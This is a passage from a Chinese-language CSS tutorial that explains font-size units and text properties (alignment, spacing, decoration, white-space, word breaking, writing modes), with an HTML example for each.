<percentage>。\n\n<html>\n<head>\n    <style type="text/css">\n    p.one { font-size: xx-small }\n    p.two { font-size: x-small; }\n    p.three { font-size: small; }\n    p.four { font-size: medium; }\n    p.five { font-size: large; }\n    p.six { font-size: x-large; }\n    p.seven { font-size: xx-large; }\n    </style>\n</head>\n<body>\n    <p class="one">This paragraph (class \'one\') has a font size of \'xx-small\'.</p>\n    <p class="two">This paragraph (class \'two\') has a font size of \'x-small\'.</p>\n    <p class="three">This paragraph (class \'three\') has a font size of \'small\'.</p>\n    <p class="four">This paragraph (class \'four\') has a font size of \'medium\'.</p>\n    <p class="five">This paragraph (class \'five\') has a font size of \'large\'.</p>\n    <p class="six">This paragraph (class \'six\') has a font size of \'x-large\'.</p>\n    <p class="seven">This paragraph (class \'seven\') has a font size of \'xx-large\'.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nsmaller和larger是更小和更大，是在一个继承到的字体大小基础上除以或者乘以一个放大系数，这个放大系数在css1的时候是1.5，现在css3是个比较复杂的比率。\n\n<percentage>就是使用百分比了，是相对于父元素字体大小的百分比。\n\n<length>就是使用长度单位的大小了，例子如下：\n\n<html>\n<head>\n    <style type="text/css">\n    p { line-height: 1; margin: 0.5em; }\n    p.one { font-size: 36pt; }\n    p.two { font-size: 3pc; }\n    p.three { font-size: 0.5in; }\n    p.four { font-size: 1.27cm; }\n    p.five{ font-size: 12.7mm; }\n    </style>\n</head>\n<body>\n    <p class="one">36 point font size</p>\n    <p class="two">3 pica font size</p>\n    <p class="three">0.5 inch font size</p>\n    <p class="four">1.27 centimeter font size</p>\n    <p class="five">12.7 millimeter font size</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n最常用的长度单位：\n\n * px: 像素，相对于显示器屏幕分辨率而言的。这是一个绝对单位，它导致了在任何情况下，页面上的文本所计算出来的像素值都是一样的。\n * em: 1em 等于我们设计的当前元素的父元素上设置的字体大小。大多数浏览器的默认字体是16px，那么一开始1em等于16px，但这样的换算很麻烦，所以在html或者body选择器中声明了font-size: 62.5%，那么1em就等于10px，在对旧项目使用em时就很方便的对px除以10就可以得到新的em了。\n * rem: 这个单位的效果和 em 差不多，除了 1rem 等于 HTML 中的根元素的字体大小 ，而不是父元素。这可以让你更容易计算字体大小，但是遗憾的是， rem 不支持 Internet Explorer 8 和以下的版本。\n\n字体替换问题：\n\nfont-size-adjust设置的值是字体的aspect（比例值），aspect是“该字体的x高度”除以“该字体尺寸”。如果页面某个局部需要使用新字体，但需要新旧字体的展示大小一样（以免影响内容大小或布局）。那么就可以通过font-size-adjust和font-size来调整新字体最终展示效果，也就是让替换前后的小写字母x展示效果一样。\n\n推导过程，x展示效果要一样，那么可得到这样一个等式：替换后字体大小 * 替换后的aspect = 替换前的字体大小 * 替换前的aspect。最后就可以得到替换字体后，font-size要设置的新值为替换后字体大小 = 替换前的字体大小 * 替换前的aspect / 替换后的aspect。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            font-family: Comic Sans MS;\n            font-size: 16px;\n            font-size-adjust: 0.54;\n        }\n        div#div2 {\n            font-family: Times New Roman;   /*将Comic Sans MS替换成Times New Roman*/\n            font-size: 19px;                /* 16 * 0.54 / 0.46 约等于19 */\n            font-size-adjust: 0.46;\n        }\n    </style>\n</head>\n<body>\n    <div id="div1">It is fine today.Never change your plans because of the weather.</div>\n    <div id="div2">It is fine today.Never change your plans because of the weather.</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 1.5 斜体、字体压缩拉伸\n\nfont-style属性用于设置字体是否斜体，值一般就是三个italic | oblique | normal，italic是最常用的斜体，而oblique是一种比较少用的斜体。oblique的整体倾斜效果没有italic大，oblique就算是倾斜的，它的一部分还是有那种直立的效果（可以通过某种方法将normal处理成oblique）。可以看这下面这个图示：\n\n\n\n如果italic没有映射到真实的斜体，可以使用oblique的版本作为italic来使用，而反过来一般是不行。\n\nfont-stretch属性用于设置字体压缩拉伸的，可能是拉伸的也可能是压缩的，其值normal | ultra-condensed | extra-condensed | condensed | semicondensed | semi-expanded | expanded | extra-expanded | ultraexpanded，这种和字体大小的值用法类似，如果没有映射到真实的值就可能在页面上不起作用。\n\n\n\n\n# 二、文本属性\n\n\n# 2.1 缩进\n\ntext-indent属性设置在块级元素上，会对其内部的文本第一行的开头进行缩进，它的值有<length>和<percentage>两种方式（百分比是相对于父容器宽度）。解释说明：text-indent是设置在块级元素上，或者说是设置在具有块级特性的元素上，然后对其内部具有内联特性的元素进行缩进。如果你不想对块级父容器设置text-indent，但又想让其内部有缩进的效果，那么可以试着使用左外边距margin-left。\n\n<html>\n<head>\n    <style type="text/css">\n    .one { text-indent: 3rem; }\n    .two { text-indent: 3rem; } /* 无效，得设置在块级元素上 */\n    .three { margin-left: 3rem; }\n    </style>\n</head>\n<body>\n    <p class="one">Said Tommy the Cat as he reeled back to clear whatever foreign matter may have nestled its way into his mighty throat.</p>\n    <span class="two">Said Tommy the Cat as he reeled back to clear whatever foreign matter may have nestled its way into his mighty throat. </span><br>\n    <span class="three">Said Tommy the Cat as he reeled back to clear whatever foreign matter may have nestled its way into his mighty throat. </span>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 2.2 水平对齐\n\ntext-align属性也设置在块级元素上，会对其内部的文本每一行的文字进行水平方向上的对齐，可取值比较多start | end | left | right | center | justify | match-parent。解释说明：text-align设置在具有块级特性的元素上，然后对其内部具有内联特性的元素进行水平对齐。\n\n 1. left和right与书写模式无关，就是于行框的左或者右边进行对齐。\n 2. start和end就取决于书写模式。比如从左到右的顺序，那start跟left是一样的效果，end和right是一样的效果。\n    * start：表示文本对齐到其行框的开始边缘。\n    * end：表示文本对齐到其行框的结束边缘。\n 3. justify是两端对齐，会保证每一行文本显示长度一样，也就说在单词不足的情况下可能会拉伸显示效果。对最后一行无效，justify-all可以让最后一行也强制两端对齐，不过有些浏览器没有实现该功能。\n 4. match-parent和inherit类似，区别在于start和end的值根据父元素的direction确定，并被替换为恰当的left或right。\n\n<html>\n<head>\n    <style type="text/css">\n    .table { width: 700px; display: table; }\n    .row { display: table-row; }\n    .cell {\n        display: table-cell;\n        width: calc(33.33% - 1rem);\n        box-sizing: border-box;\n        margin: .5rem;\n        padding: .5rem;\n        background-color: #FFF;\n        overflow: hidden;\n    }\n    p {\n        font: .8rem sans-serif;\n        max-width: 100%;\n        box-sizing: border-box;\n        overflow: hidden;\n        resize: horizontal;\n        background: #E4F0F5;\n        padding: .5rem;\n        margin: .5rem 0 0;\n    }\n    .taLeft       { text-align: left;        }\n    .taRight      { text-align: right;       }\n    .taCenter     { text-align: center;      }\n    .taJustify    { text-align: justify;     }\n    .taJustifyAll { text-align: justify-all; }\n    .taStart      { text-align: start;       }\n    .taEnd        { text-align: end;         }\n\n    .rtl { direction: rtl; }\n    .ltr { direction: ltr; }\n    </style>\n</head>\n<body>\n    <div class="table">\n        <div class="row">\n            <div class="cell">\n                left\n                <p class="taLeft">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam pellen tesque vehicu la con vallis.</p>\n            </div>\n            <div class="cell">\n                start (ltr)\n                <p class="taStart ltr">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam pellen tesque vehicu la con vallis.</p>\n            </div>\n            <div class="cell">\n                start (rtl)\n                <p class="taStart rtl">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam pellen tesque vehicu la con vallis.</p>\n            </div>\n        </div>\n        <div class="row">\n            <div class="cell">\n                right\n                <p class="taRight">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam pellen tesque vehicu la con vallis.</p>\n            </div>\n            <div class="cell">\n                end (ltr)\n                <p class="taEnd ltr">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam pellen tesque vehicu la con vallis.</p>\n            </div>\n            <div class="cell">\n                end (rtl)\n                <p class="taEnd rtl">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam pellen tesque vehicu la con vallis.</p>\n            </div>\n        </div>\n        <div class="row">\n            <div class="cell">\n                center\n                <p class="taCenter">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam pellen tesque vehicu la con vallis.</p>\n            </div>\n            <div class="cell">\n                justify\n                <p class="taJustify">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam pellen tesque vehicu la con vallis.</p>\n            </div>\n            <div class="cell">\n                justify-all\n                <p class="taJustifyAll">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam pellen tesque vehicu la con vallis.</p>\n            </div>\n        </div>\n    </div>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n\n\n如果想让文本最后一行进行不同于整个文本的对齐方式，那么可以使用text-align-last，它的值有auto | start | end | left | right | center | justify。\n\n\n# 2.3 垂直对齐\n\n# 2.3.1 基线与行高\n\n可以参考前面一章的内容——line-height和baseline\n\n**基线(baseline)**是用于在上面放置字符的一条假象的基准线，像g和p会有下降。基线位置的确定最好还是去看一下前一章的内容。\n\n\n\n**行高(line-height)**主要用于给文字撑出高度用的，最后的值也会作为内联非替换元素的inline box的高度。\n\nline-height取值<number> | <length> | <percentage> | normal。normal是默认值，具体值通常是字体大小的 1.2 倍；<number>是个无单位数值，会乘以该元素的字体大小，与<percentage>差不多；<length>就是最常见的长度值了。不推荐在行高上使用em，因为em是取父级字体大小可能不适用本元素的高度。\n\n# 2.3.2 垂直对齐\n\n可以参考前面一章的内容——vertical-align\n\n垂直对齐使用vertical-align，它是直接设置在内联元素（内联特性）或者单元格上的，也就说你在块级元素上设置vertical-align，其子元素或者内容是没有垂直对齐的。vertical-align的值有baseline | sub | super | top | text-top | middle | bottom | text-bottom | <length> | <percentage>。\n\n * baseline：默认值，让元素的baseline与父元素的baseline进行对齐。\n * middle：中间对齐，让元素的中部与父元素的baseline加上x-height的一半（baseline + x-height / 2）进行对齐。\n * sub：下标基线对齐，让元素的baseline与父元素的下标基线进行对齐。\n * super：上标基线对齐，让元素的baseline与父元素的上标基线进行对齐。\n * text-top：文本框顶部对齐，让元素的inline box顶部与父元素的文本框（单行）顶部进行对齐。\n * text-bottom：文本框底部对齐，让元素的inline box底部与父元素的文本框（单行）底部进行对齐。\n * top：line box顶部对齐，让元素的inline box顶部与当前行的line box顶部进行对齐。\n * bottom：line box底部对齐，让元素的inline box底部与当前行的line box底部进行对齐。\n\n<html>\n<head>\n    <style type="text/css">\n      .outer { background-color: red; }\n      .inner {\n        display: inline-block;\n        width: 100px;\n        height: 100px;\n        background-color: skyblue;\n        /*底部空隙的问题是预留了字符下降的空间与也就是line-height的影响*/\n        /*vertical-align: middle;*/\n      }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <li class="inner"></li>\n        <li class="inner"></li>\n        <li class="inner"></li>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n<html>\n<head>\n    <style type="text/css">\n    body { width: 500px; }\n    span.raise { vertical-align: super; }\n    span.lower { vertical-align: sub; }\n    </style>\n</head>\n<body>\n    <p>This paragraph contains <span class="raise">superscripted</span>\n    and <span class="lower">subscripted</span>  text.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nvertical-align的另外两种取值:\n\n * <length>使元素的基线对齐到父元素的基线之上的给定长度。可以是负数。\n * <percentage>使元素的基线对齐到父元素的基线之上的给定百分比，该百分比是line-height属性的百分比。可以是负数。\n\n# 2.3.3 单元格的垂直对齐\n\n一般vertical-align都是设置在内联元素上，然后让内容元素相对于它所在的line box容器进行垂直对齐的。但是vertical-align有个特殊场景，就是设置在单元格上，让单元格内容相对于单元格容器进行垂直对齐。\n\n在单元格上设置vertical-align，其值一般是top | bottom | middle | baseline，取这些值会被忽略sub | super | text-top | text-bottom。\n\n<html>\n<head>\n    <style type="text/css">\n    .outer {\n        display: table-cell;\n        /*让单元格里整个内容，相对于单元格这个容器进行一个垂直居中对齐*/\n        vertical-align: middle;\n        width: 280px;\n        height: 200px;\n        border: 1px solid;\n        margin: 0;\n    }\n    .inner1 {\n        display: inline-block;\n        /*让inner1的底部与当前行文本底部对齐*/\n        vertical-align: text-bottom;\n        width: 50px;\n        height: 50px;\n        border: 1px solid blue;\n    }\n    .inner2 {\n        display: inline-block;\n        /*让inner2的中部与当前行“基线加上x一半高度”这个位置进行对齐*/\n        vertical-align: middle;\n        width: 40px;\n        height: 40px;\n        border: 1px solid red;\n    }\n    </style>\n</head>\n<body>\n    <div class="outer">Xx\n        <div class="inner1"></div>Xx\n        <div class="inner2">Xx</div>Xx<br>XxXxXxXxXxXxXxXx\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n小节一下：text-align设置在父级块元素，让子级内联元素去对齐。vertical-align设置在子级内联元素，让它本身相对于line box去对齐，特殊情况下设置在父级单元格上，让子级元素（块级和内联都行）去对齐。\n\n\n# 2.4 文本间距\n\n# 2.4.1 词间距\n\nword-spacing属性单词之间的间距的，默认值是normal，可以设置其他长度值（为0跟normal一样的效果）。是对于单词来说的，但是在非英语文本下，无法定义这个“词”是什么，所以它可能会失效\n\n<html>\n<head>\n    <style type="text/css">\n    p.spread { word-spacing: 0.5em; }\n    p.tight { word-spacing: -0.5em; }\n    p.base { word-spacing: normal; }\n    p.norm { word-spacing: 0; }\n    p.text { word-spacing: 0.5em; }\n    </style>\n</head>\n<body>\n    <p class="spread">The spaces between words in this paragraph will be increased by 0.5em.</p>\n    <p class="tight">The spaces between words in this paragraph will be decreased by 0.5em.</p>\n    <p class="base">The spaces between words in this paragraph will be normal.</p>\n    <p class="norm">The spaces between words in this paragraph will be normal.</p>\n    <p class="text">你是谁？</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 2.4.2 字间距\n\n词间距无法影响到字母间的间距，字间距letter-spacing就是来控制字间距的（<length> | normal），其实它也能影响到词间距。\n\n<html>\n<head>\n    <style type="text/css">\n    p { letter-spacing: 0; }    /*  identical to \'normal\'  */\n    p.spacious { letter-spacing: 0.25em; }\n    p.tight { letter-spacing: -0.25em; }\n    </style>\n</head>\n<body>\n    <p>The letters in this paragraph are spaced as normal.</p>\n    <p class="spacious">The letters in this paragraph are spread out a bit.</p>\n    <p class="tight">The letters in this paragraph are smooshed together a bit.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 2.5 文本大小写\n\ntext-transform属性用于操作文本里单词的大小写，值uppercase是全部大写，lowercase是全部小写，capitalize是首字母小写，none就不设置大小写按照原文来。\n\n<html>\n<head>\n    <style type="text/css">\n    h1 { text-transform: capitalize; }\n    strong { text-transform: uppercase; }\n    p.cummings { text-transform: lowercase; }\n    p.raw { text-transform: none; }\n    </style>\n</head>\n<body>\n    <h1>The heading-one at the beginninG</h1>\n    <p>By default, text is displayed in the capitalization it has in the source document, but<strong>it is possible to change this</strong> using the property \'text-transform\'.</p>\n    <p class="cummings">For example, one could Create TEXT such as might have been Written by the late Poet e.e.cummings.</p>\n    <p class="raw">If you feel the need to Explicitly Declare the transformation of text to be \'none\', that can be done as well.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 2.6 文本修饰\n\ntext-decoration用于对文本进行修饰，也就是加横线的。有这些值：none | [ underline ‖ overline ‖ line-through ‖ blink ]。\n\n * none：关闭了任何可能应用于元素的修饰。用于显示默认的文本或者去掉超链接的下划线。\n * underline：给文本加下划线。\n * overline：给文本加上划线。\n * line-through：给文本加上删除线。\n * blink：将本文显示得忽明忽暗，这个功能浏览器不一定实现了。\n\n可以组合使用，但可能会被覆盖：\n\n<html>\n<head>\n    <style type="text/css">\n    a { text-decoration: none; }\n    a:hover,\n    a:visited {\n      text-decoration: underline overline;\n    }\n    h2.stricken { text-decoration: line-through; }\n    h2 { text-decoration: underline overline; }\n    </style>\n</head>\n<body>\n    <a href="https://www.baidu.com">百度一下</h1>\n    <h2 class="stricken">章节2.1<h2>\n    <h2>章节2.2<h2>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\ntext-decoration会用的问题，如果在父元素里使用它，在子元素里可能屏蔽不了。\n\n<html>\n<head>\n    <style type="text/css">\n    p { text-decoration: underline; color: black; }\n    /* 使用颜色silver，再text-decoration改为underline，能降低子元素的下划线显示 */\n    strong { color: gray; text-decoration: none; }\n    </style>\n</head>\n<body>\n    <p>This paragraph, which is black and has a black underline, also contains<strong>strongly emphasized text</strong> which has the black underline beneath it as well.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 2.7 文本阴影\n\ntext-shadow属性用来给文本加阴影背景的。使用方法：text-shadow: length length length color，值的意思分别是“横方向距离”、“纵方向距离”、“阴影模糊半径”、“阴影颜色”；前两个值为正数时是往右和下偏移，负数就是相反方向；第三个值是阴影所在模糊半径，为0时跟原文字一样，越大就越模糊。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            text-shadow: 5px 5px 5px gray;\n            color: navy;\n            font-size: 50px;\n            font-weight: bold;\n            font-family: 宋体;\n        }\n    </style>\n</head>\n<body>\n    <div>你好</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n我们甚至可以给文字设置多个阴影：text-shadow: length length length color,length length length color,length length length color\n\n\n# 2.8 处理文本空白\n\nwhite-space属性用于处理文本里的空白，其值normal | nowrap | pre | pre-wrap | pre-line。\n\n * normal：连续的空白符会被合并，换行符会被当作空白符来处理，满一行（达到父容器宽度）时才会换行。\n * nowrap：与normal大部分一致，唯一的区别就是在满一行（达到父容器宽度）时不会进行换行。\n * pre：连续的空白符会被保留，遇到换行符会换行，满一行（达到父容器宽度）时不会进行换行。\n * pre-wrap：连续的空白符会被保留，遇到换行符会换行（填充line box才会换行)，满一行（达到父容器宽度）时会换行。\n * pre-line：连续的空白符会被合并，遇到换行符会换行（填充line box才会换行)，满一行（达到父容器宽度）时会换行。\n * 可能还会有break-spaces，与pre-wrap的行为相同，除了：\n   * 任何保留的空白序列总是占用空间，包括在行尾。\n   * 每个保留的空格字符后都存在换行机会，包括空格字符之间。\n   * 这样保留的空间占用空间而不会挂起，从而影响盒子的固有尺寸（最小内容大小和最大内容大小）。\n\nWHITE-SPACE    空格(含制表符)   换行符   文字满一行   行尾空格\nnormal         合并         合并    换行      删除\nnowrap         合并         合并    不换行     删除\npre            保留         换行    不换行     保留\npre-wrap       保留         换行    换行      挂起\npre-line       合并         换行    换行      删除\nbreak-spaces   保留         换行    换行      换行\n\n<html>\n<head>\n    <style type="text/css">\n    body { width: 300px; }\n    /*normal和nowrap效果大部分一致，超过父容器宽度时，normal会换行，nowrap却不会*/\n    p { white-space: nowrap; } /* normal和nowrap替换看效果*/\n    </style>\n</head>\n<body>\n    \x3c!--normal和nowrap，都会让多余的空格进行合并，并且换行符也会被视为空格。超过父容器宽度时就不一样了。--\x3e\n    <p>This paragraph is not allowed to wrap,\n    which means that the only way to end a line is to insert a line-break\n    element.  If no such element is inserted, then the line will go forever,\n    forcing the user to scroll horizontally to read whatever can\'t be\n    initially displayed <br>in the browser window.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n<html>\n<head>\n    <style type="text/css">\n    body { width: 100px; }\n    /*多余空白被保留，遇到换行符和<br>进行换行，但是超过父容器宽度时却不会自动换行*/\n    p { white-space: pre; }\n    </style>\n</head>\n<body>\n    <p>This   paragraph   is   not   allowed   to   wrap,\n    which  means   that the only way   to end a    line is to insert a line-break element.  If no such element is inserted,    then the line will go forever,\n    forcing the user to    scroll    horizontally to    read whatever can\'t be\n    initially displayed <br>in the browser window.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n<html>\n<head>\n    <style type="text/css">\n    body { width: 500px; }\n    /*pre-wrap其实和pre差不多，多余空白被保留，遇到换行符和<br>进行换行。但是在超过父容器宽度时换行*/\n    /*pre-line，多余空白被合并，遇到换行符和<br>进行换行，在超过父容器宽度时换行*/\n    p { white-space: pre-line; } /* pre-wrap和pre-line替换看效果*/\n    </style>\n</head>\n<body>\n    \x3c!--normal和nowrap，都会让多余的空格进行合并，并且换行符也会被视为空格。超过父容器宽度时就不一样了。--\x3e\n    <p>        This   paragraph   is   not   allowed   to   wrap,\n    \n    which  means   that the only way   to end a    line is to insert a line-break element.  If no such element is inserted,    then the line will go forever,\n    forcing the user to    scroll    horizontally to    read whatever can\'t be\n    initially displayed <br>in the browser window.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\ntab-size用于设置（在块级元素上，对内部的内联元素作用）制表符对应的空格，默认情况下是8个空格。它还可以设置长度，一个制表符的长度。\n\n<html>\n<head>\n    <style type="text/css">\n    p { white-space: pre-wrap; margin: 0.5em; }\n    code { font: 1em monospace, serif; }\n    .cl01 { tab-size: 8; }\n    .cl02 { tab-size: 4; }\n    .cl03 { tab-size: 2; }\n    .cl04 { tab-size: 0; }\n    .cl05 { tab-size: 8; white-space: normal; }\n    </style>\n</head>\n<body>\n    <p class="cl01">            This sentence is preceded by three tabs, set to a length of 8.\n    </p>\n    <p class="cl02">            This sentence is preceded by three tabs, set to a length of 4.\n    </p>\n    <p class="cl03">            This sentence is preceded by three tabs, set to a length of 2.\n    </p>\n    <p class="cl04">            This sentence is preceded by three tabs, set to a length of 0.\n    </p>\n    <p class="cl05">            This sentence is preceded by three tabs, set to a length of 8—but <code>white-space</code> is <code>normal</code>.\n    </p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# 2.9 处理文本换行\n\n# 2.9.1 连字符\n\n在长单词换行或者连起来的词组时常使用连字符-，在编码中是U+00AD或&shy;。在css中是hyphens属性，值有manual | auto | none。manual表示手动插入U+00AD或&shy;才会显示连字符，none会忽略连字符即使使用了U+00AD或&shy;，auto是自动根据文本的换行对长单词添加连字符。不过连字符在浏览器可能不会被实现，这个得注意。\n\n# 2.9.2 word-break\n\nword-break用于文本换行时，对单词或者其他文字的处理行为，其值有normal、keep-all、break-all。normal表示使用浏览器默认换行规则，keep-all表示只能在半角空格或连字符处换行、break-all表示允许在单词内换行。\n\n浏览器默认换行：英文下，不会在单词内换行，只会在半角空格或连字符的地方换行；中文不会有这样的问题，标点符号也不会作为一行的首字，会拿一个汉字和标点符号一起换行。\n\n<html lang="en">\n<head>\n<style type="text/css">\np {border: 1px dotted orange;}\ndiv {float: left; width: 12em; margin-right: 3em;}\ndiv h6 {text-align: center;}\n.d01 {word-break: normal;}\n.d02 {word-break: break-all;}\n.d03 {word-break: keep-all;}\n.cl02 {direction: rtl;}\n</style>\n</head>\n<body>\n    <div class="d01">\n        <h6>word-break: normal;</h6>\n        <p class="cl01">It is fine today.Never change your plans because of the weather.</p>\n        <p class="cl02">هذا هو سلسلة طويلة غامضة من النص العربي، الذي يتدفق من اليمين إلى اليسار.</p>\n        <p class="cl03">これは、左から右に流れる漠然と日本語テキストの長い文字列です。</p>\n        <p class="cl04">天气真不错，出去逛逛吧？去哪呢？去南京东路步行街吧！</p>\n    </div>\n    <div class="d02">\n        <h6>word-break: break-all;</h6>\n        <p class="cl01">It is fine today.Never change your plans because of the weather.</p>\n        <p class="cl02">هذا هو سلسلة طويلة غامضة من النص العربي، الذي يتدفق من اليمين إلى اليسار.</p>\n        <p class="cl03">これは、左から右に流れる漠然と日本語テキストの長い文字列です。</p>\n        <p class="cl04">天气真不错，出去逛逛吧？去哪呢？去南京东路步行街吧！</p>\n    </div>\n    <div class="d03">\n        <h6>word-break: keep-all;</h6>\n        <p class="cl01">It is fine today.Never change your plans because of the weather.</p>\n        <p class="cl02">هذا هو سلسلة طويلة غامضة من النص العربي، الذي يتدفق من اليمين إلى اليسار.</p>\n        <p class="cl03">これは、左から右に流れる漠然と日本語テキストの長い文字列です。</p>\n        <p class="cl04">天气真不错，出去逛逛吧？去哪呢？去南京东路步行街吧！</p>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n可以看上面这个例子里，break-all对英文不友好因为切断了单词，对中文挺正常的（与normal中文环境下一致）；而keep-all在英文下还挺正常的（与normal英文环境下一致），但对中文就不友好了，必须遇到标点符号才能换行。综上，最好还是使用word-break: normal。\n\n# 2.9.2 overflow-wrap\n\n英文的换行只在半角空格或连字符的地方换行，但是长单词里没有半角空格和连字符，那它显示时就会超过边界，那么使用overflow-wrap: break-word可以解决长单词的问题。overflow-wrap的另外一个值normal，表示在正常断点处换行，如果长单词超过边界就直接溢出显示。\n\n因为历史原因，word-wrap属性原本属于微软的一个私有属性，在 CSS3 现在的文本规范草案中已经被重名为overflow-wrap。word-wrap现在被当作 overflow-wrap的“别名”。 稳定的谷歌Chrome和Opera浏览器版本支持这种新语法。\n\nwhite-space: pre的设置会让overflow-wrap: break-word对长单词的处理失效，因为white-space: pre只在换行符和<br>时换行，在满父容器一行时也不会自动换行的。\n\n<html lang="en">\n<head>\n<style type="text/css">\np { width: 14em; margin: 2px; background: gold; }\n.ow-anywhere { overflow-wrap: normal; }\n.ow-break-word { overflow-wrap: break-word; }\n.word-break { word-break: break-all; }\n.pre { overflow-wrap: break-word; white-space: pre; }\n</style>\n</head>\n<body>\n    <p>They say the fishing is excellent at\n    Lake <em class="normal">Chargoggagoggmanchauggagoggchaubunagungamaugg</em>,\n    though I\'ve never been there myself. (<code>normal</code>)</p>\n    <p>They say the fishing is excellent at \n    Lake <em class="ow-anywhere">Chargoggagoggmanchauggagoggchaubunagungamaugg</em>, \n    though I\'ve never been there myself. (<code>overflow-wrap: normal</code>)</p>\n    <p>They say the fishing is excellent at\n    Lake <em class="ow-break-word">Chargoggagoggmanchauggagoggchaubunagungamaugg</em>,\n    though I\'ve never been there myself. (<code>overflow-wrap: break-word</code>)</p>\n    <p>They say the fishing is excellent at\n    Lake <em class="word-break">Chargoggagoggmanchauggagoggchaubunagungamaugg</em>,\n    though I\'ve never been there myself. (<code>word-break: break-all;</code>)</p> \n    <p>They say the fishing is excellent at\n    Lake <em class="pre">Chargoggagoggmanchauggagoggchaubunagungamaugg</em>,\n    though I\'ve never been there myself. (<code>overflow-wrap: break-word;white-space: pre;</code>)</p> \n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 2.10 书写模式\n\n# 2.10.1 writing-mode\n\nwriting-mode属性用于指定三种书写模式，值有horizontal-tb | vertical-rl | vertical-lr。\n\n * horizontal-tb：表示一个水平的内联方向，一个从上到下的块方向。默认为文字是从左到右然后从上到下。\n * vertical-rl：表示一个垂直的内联方向，一个从右到左的块方向。默认为文字是从上到下然后从右到左。\n * vertical-lr：表示一个垂直的内联方向，一个从左到右的块方向。默认为文字是从上到下然后从左到右。\n\n\n\n# 2.10.2 text-orientation\n\n在确定了书写模式后，我们可以更改个别文本的字符方向，因为有可能需要显示不同语言的文本，或者表头需要临时的不同字符方向的显示。\n\ntext-orientation属性就是用于此，有三个值mixed | upright | sideways。特别要注意的是，水平书写方式是正常的，text-orientation是不会起作用，但是会改变writing-mode: vertical-rl和writing-mode: vertical-lr里的字符展示方向，也就是说text-orientation只会影响纵向的。\n\n * mixed：默认值。各种语言混合的，原本是怎么展示的就怎么展示。比如英文在垂直展示时是“躺着”的就仍然“躺着”，中文在垂直展示时是“站着”的就仍然“站着”。\n * upright：将字符进行直排。比如英文在垂直展示时是“躺着”的，那现在是“站着”的，中文不变。\n * sideways：所有字符被布局为与水平方式一样，只是整个文本被顺时针旋转90°。也就是说，它是将horizontal-tb情况下的展示效果顺时针旋转90°。\n\n<html>\n<head>\n    <style>\n    [lang="zh"] { color: blue; }\n    .arena p[class] {\n        border: 1px dotted;\n        float: left;\n        width: 11rem;\n        height: 9em;\n        margin-right: 2rem;\n        